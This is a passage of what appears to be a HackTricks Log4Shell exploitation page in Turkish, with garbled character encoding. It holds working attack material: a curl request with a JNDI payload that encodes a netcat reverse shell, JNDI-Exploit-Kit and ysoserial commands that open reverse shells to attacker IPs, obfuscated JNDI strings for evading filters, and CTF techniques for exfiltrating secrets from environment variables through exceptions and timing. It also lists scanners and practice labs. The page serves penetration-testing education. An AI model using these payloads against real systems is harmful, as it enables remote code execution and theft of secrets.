curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Ã–nceki saldÄ±rÄ±ya benzer ÅŸekilde, bu zafiyeti sÃ¶mÃ¼rmek iÃ§in [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)'i kullanmayÄ± deneyebilirsiniz.\
Kurban'a gÃ¶ndermek iÃ§in URL'leri oluÅŸturabilirsiniz:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Bu saldÄ±rÄ±, Ã¶zel olarak oluÅŸturulmuÅŸ bir java nesnesini kullanarak **THM solar room** gibi laboratuvarlarda Ã§alÄ±ÅŸacaktÄ±r. Bununla birlikte, genel olarak Ã§alÄ±ÅŸmayacaktÄ±r (Ã§Ã¼nkÃ¼ Java varsayÄ±lan olarak LDAP kullanarak uzak kod tabanÄ±nÄ± yÃ¼kleme ÅŸeklinde yapÄ±landÄ±rÄ±lmamÄ±ÅŸtÄ±r) Ã§Ã¼nkÃ¼ gÃ¼venilen bir sÄ±nÄ±fÄ± kÃ¶tÃ¼ye kullanarak keyfi kod yÃ¼rÃ¼tmÃ¼yor gibi gÃ¶rÃ¼nÃ¼yor._

### RCE - ysoserial ve JNDI-Exploit-Kit

Bu seÃ§enek, yalnÄ±zca belirli sÄ±nÄ±flara gÃ¼venen **Java sÃ¼rÃ¼mlerini hedef almak iÃ§in gerÃ§ekten kullanÄ±ÅŸlÄ±dÄ±r ve herkese gÃ¼venmez**. Bu nedenle, **ysoserial**, **gÃ¼venilen sÄ±nÄ±flarÄ±n serileÅŸtirilmesini oluÅŸturmak iÃ§in kullanÄ±lacaktÄ±r** ve bu, **keyfi kod yÃ¼rÃ¼tmek iÃ§in kullanÄ±labilecek aygÄ±tlar olarak** (_ysoserial tarafÄ±ndan kÃ¶tÃ¼ye kullanÄ±lan gÃ¼venilen sÄ±nÄ±f, saldÄ±rÄ±nÄ±n Ã§alÄ±ÅŸabilmesi iÃ§in kurban java programÄ± tarafÄ±ndan kullanÄ±lmalÄ±dÄ±r_).

**ysoserial** veya [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) kullanarak JNDI tarafÄ±ndan indirilecek serileÅŸtirme saldÄ±rÄ±sÄ±nÄ± oluÅŸturabilirsiniz:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Kullanarak [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)â€™i kullanarak **JNDI baÄŸlantÄ±larÄ±** oluÅŸturun, bu baÄŸlantÄ±lar zafiyetli makinelerden gelen baÄŸlantÄ±larÄ± bekleyecektir. JNDI-Exploit-Kit tarafÄ±ndan otomatik olarak oluÅŸturulan **farklÄ± exploitâ€™larÄ±** sunabilir veya kendi deserializasyon yÃ¼klerinizi (siz veya ysoserial tarafÄ±ndan oluÅŸturulan) sunabilirsiniz.
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

ArtÄ±k zafiyeti sÃ¶mÃ¼rmek ve bir **ters kabuk** elde etmek iÃ§in oluÅŸturulan JNDI baÄŸlantÄ±sÄ±nÄ± kolayca kullanabilirsiniz: **`${ldap://10.10.14.10:1389/generated}`**

### Atlatmalar
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:Ä±}}:ldap://...} //Notice the unicode "i"
```
### Otomatik TarayÄ±cÄ±lar

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Yerel savunmasÄ±z kÃ¼tÃ¼phaneleri bulun

### Test LaboratuvarlarÄ±

* [**LogForge HTB makinesi**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar odasÄ±**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shell SÄ±zma SonrasÄ± SÃ¶mÃ¼rÃ¼

Bu [**CTF yazÄ±sÄ±**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) potansiyel olarak **Log4J**'nin bazÄ± Ã¶zelliklerinin **istismar edilebileceÄŸini** iyi bir ÅŸekilde aÃ§Ä±klÄ±yor.

Log4j'in [**gÃ¼venlik sayfasÄ±**](https://logging.apache.org/log4j/2.x/security.html) ilginÃ§ cÃ¼mleler iÃ§eriyor:

> Java 8 iÃ§in 2.16.0 sÃ¼rÃ¼mÃ¼nden itibaren **mesaj aramalarÄ± Ã¶zelliÄŸi tamamen kaldÄ±rÄ±lmÄ±ÅŸtÄ±r**. **YapÄ±landÄ±rmadaki aramalar hala Ã§alÄ±ÅŸÄ±r**. AyrÄ±ca, Log4j artÄ±k varsayÄ±lan olarak JNDI eriÅŸimini devre dÄ±ÅŸÄ± bÄ±rakÄ±r. YapÄ±landÄ±rmadaki JNDI aramalarÄ±nÄ±n aÃ§Ä±k olmasÄ± gerekir.

> 2.17.0 sÃ¼rÃ¼mÃ¼nden itibaren (ve Java 7 ve Java 6 iÃ§in 2.12.3 ve 2.3.1), **yapÄ±landÄ±rmadaki yalnÄ±zca arama dizeleri Ã¶zyinelemeli olarak geniÅŸletilir**; diÄŸer herhangi bir kullanÄ±mda, yalnÄ±zca Ã¼st dÃ¼zey arama Ã§Ã¶zÃ¼lÃ¼r ve herhangi bir iÃ§ iÃ§e arama Ã§Ã¶zÃ¼lmez.

Bu, varsayÄ±lan olarak herhangi bir `jndi` istismarÄ±nÄ± **kullanamayacaÄŸÄ±nÄ±zÄ±** gÃ¶sterir. DahasÄ±, **Ã¶zyinelemeli aramalarÄ±** gerÃ§ekleÅŸtirmek iÃ§in bunlarÄ± yapÄ±landÄ±rmanÄ±z gerekir.

Ã–rneÄŸin, bu CTF'de log4j2.xml dosyasÄ±nda ÅŸu ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Ortam AramalarÄ±

Bu [CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) sÄ±rasÄ±nda saldÄ±rgan `${sys:cmd}` deÄŸerini kontrol ediyordu ve bayraÄŸÄ± bir ortam deÄŸiÅŸkeninden dÄ±ÅŸarÄ± Ã§Ä±karmasÄ± gerekiyordu.\
Bu sayfada [**Ã¶nceki yÃ¼klerde**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi, **`${env:FLAG}`** gibi farklÄ± yollarla ortam deÄŸiÅŸkenlerine eriÅŸmek mÃ¼mkÃ¼ndÃ¼r. Bu CTF'de bu iÅŸe yaramadÄ± ancak diÄŸer gerÃ§ek senaryolarda iÅŸe yarayabilir.

### Ä°stisnalarda DÄ±ÅŸarÄ± Ã‡Ä±karma

CTF'de, log4J kullanarak java uygulamasÄ±nÄ±n stderr'Ä±na eriÅŸilemiyordu, ancak Log4J **istisnalarÄ± stdout'a gÃ¶nderiliyordu**, bu da python uygulamasÄ±nda yazdÄ±rÄ±lÄ±yordu. Bu, bir istisna tetikleyerek iÃ§eriÄŸe eriÅŸebileceÄŸimiz anlamÄ±na geliyordu. BayraÄŸÄ± dÄ±ÅŸarÄ± Ã§Ä±karmak iÃ§in bir istisna: **`${java:${env:FLAG}}`.** Bu, **`${java:CTF{blahblah}}`** mevcut olmadÄ±ÄŸÄ± iÃ§in Ã§alÄ±ÅŸÄ±r ve bayraÄŸÄ±n deÄŸeriyle bir istisna gÃ¶sterilir:

![](<../../.gitbook/assets/image (157).png>)

### DÃ¶nÃ¼ÅŸÃ¼m Desenleri Ä°stisnalarÄ±

Sadece belirtmek gerekirse, yeni [**dÃ¶nÃ¼ÅŸÃ¼m desenleri**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) enjekte edebilir ve `stdout`'a kaydedilen istisnalarÄ± tetikleyebilirsiniz. Ã–rneÄŸin:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Bu, hata mesajÄ± iÃ§indeki tarihi dÄ±ÅŸarÄ± Ã§Ä±karmak iÃ§in yararlÄ± bulunmadÄ±, Ã§Ã¼nkÃ¼ arama, dÃ¶nÃ¼ÅŸÃ¼m deseninden Ã¶nce Ã§Ã¶zÃ¼lmedi, ancak algÄ±lama gibi diÄŸer ÅŸeyler iÃ§in yararlÄ± olabilir.

### DÃ¶nÃ¼ÅŸÃ¼m Desenleri Regexler

Ancak, bazÄ± **regexleri destekleyen dÃ¶nÃ¼ÅŸÃ¼m desenleri** kullanarak, **binary search** veya **zamana dayalÄ±** davranÄ±ÅŸlarÄ± kÃ¶tÃ¼ye kullanarak bir aramadan bilgi dÄ±ÅŸarÄ± Ã§Ä±karmak mÃ¼mkÃ¼ndÃ¼r.

* **Ä°stisna mesajlarÄ± aracÄ±lÄ±ÄŸÄ±yla binary arama**

DÃ¶nÃ¼ÅŸÃ¼m deseni **`%replace`**, **regexleri** kullanarak bir **dizgeden iÃ§eriÄŸi deÄŸiÅŸtirmeyi** saÄŸlar. ÅÃ¶yle Ã§alÄ±ÅŸÄ±r: `replace{pattern}{regex}{substitution}`\
Bu davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanarak, eÄŸer regex, dize iÃ§inde herhangi bir ÅŸeyi eÅŸleÅŸirse bir istisna tetikleyebilirsiniz (eÄŸer bulunamazsa istisna olmaz) ÅŸu ÅŸekilde:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Zamana baÄŸlÄ±**

Ã–nceki bÃ¶lÃ¼mde belirtildiÄŸi gibi **`%replace`**, **regexleri** destekler. Bu nedenle, bayraÄŸÄ±n bulunduÄŸu durumda bir **zaman aÅŸÄ±mÄ±** oluÅŸturmak iÃ§in [**ReDoS sayfasÄ±ndan**](../regular-expression-denial-of-service-redos.md) bir yÃ¼kleme kullanmak mÃ¼mkÃ¼ndÃ¼r.\
Ã–rneÄŸin, `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` gibi bir yÃ¼kleme, o CTF'de bir **zaman aÅŸÄ±mÄ±** tetikleyecektir.

Bu [**yazÄ±da**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), bir ReDoS saldÄ±rÄ±sÄ± yerine yanÄ±tta bir zaman farkÄ± oluÅŸturmak iÃ§in bir **amplifikasyon saldÄ±rÄ±sÄ±** kullanÄ±ldÄ±:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> EÄŸer bayrak `flagGuess` ile baÅŸlÄ±yorsa, tÃ¼m bayrak 29 `#` ile deÄŸiÅŸtirilir (Bu karakteri kullandÄ±m Ã§Ã¼nkÃ¼ muhtemelen bayraÄŸÄ±n bir parÃ§asÄ± olmayacaktÄ±r). **SonuÃ§ olarak elde edilen 29 `#`'den her biri ardÄ±ÅŸÄ±k olarak 54 `#` ile deÄŸiÅŸtirilir**. Bu iÅŸlem **6 kez tekrarlanÄ±r**, toplamda ` 29*54*54^6* =`` `` `**`96816014208`** **`#` oluÅŸur!**
>
> Bu kadar Ã§ok `#`'nin deÄŸiÅŸtirilmesi, Flask uygulamasÄ±nÄ±n 10 saniyelik zaman aÅŸÄ±mÄ±nÄ± tetikleyecek ve bunun sonucunda kullanÄ±cÄ±ya HTTP durum kodu 500 gÃ¶nderilecektir. (EÄŸer bayrak `flagGuess` ile baÅŸlamÄ±yorsa, 500 olmayan bir durum kodu alacaÄŸÄ±z)

## Referanslar

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimizle**](https://opensea.io/collection/the-peass-family) tanÄ±ÅŸÄ±n
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek destekleyin.

</details>
